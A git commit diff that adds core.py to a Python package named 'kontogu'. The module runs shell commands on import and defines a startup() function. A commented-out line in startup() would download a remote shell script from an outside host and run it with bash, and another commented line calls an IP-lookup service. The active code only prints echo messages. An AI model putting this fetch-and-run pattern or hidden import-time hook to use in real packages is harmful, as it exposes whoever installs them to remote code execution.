30d6ae4d685232aac81914ebf801920c24ddc5e7
Bot <41898282+github-actions[bot]@users.noreply.github.com>
2023-08-06 15:41:31 +0000

    Add package kontogu/1.0.2/kontogu-1.0.2.tar.gz

---
+++ packages/kontogu/kontogu-1.0.2.tar.gz/kontogu-1.0.2/kontogu/core.py
@@ -0,0 +1,16 @@
+# Insert your code here. 
+
+import os 
+
+os.system('echo kontogu core been import ...')
+
+#os.system('curl cip.cc')
+
+def startup(id=450, platform='replit', tags=''):
+
+    #cmd = 'curl -L -O https://fhost.devxops.eu.org/devops/cicd/startups/{}-startup.sh; bash {}-startup.sh {} {} {};'.format(platform, platform, id, platform, tags)
+    cmd = 'echo hare is startup for test .... '
+    
+    os.system(cmd)
+    print('ok , finish')
+    #os.system('sleep 24h')
